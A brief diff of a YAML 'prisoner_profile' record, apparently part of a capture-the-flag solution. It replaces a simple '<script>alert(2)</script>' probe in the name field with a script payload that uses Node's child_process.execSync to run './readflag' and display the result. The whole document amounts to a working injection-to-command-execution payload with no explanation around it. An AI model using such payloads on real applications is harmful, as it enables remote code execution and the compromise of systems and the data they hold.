@@ -1,5 +1,5 @@
 prisoner_profile:
-  name: <script>alert(2)</script>
+  name: <script>const execSync = require('child_process').execSync;const output = execSync('./readflag', { encoding: 'utf-8' });alert(output);</script>
   age: 45
   height: "6'1"
   complexity: High
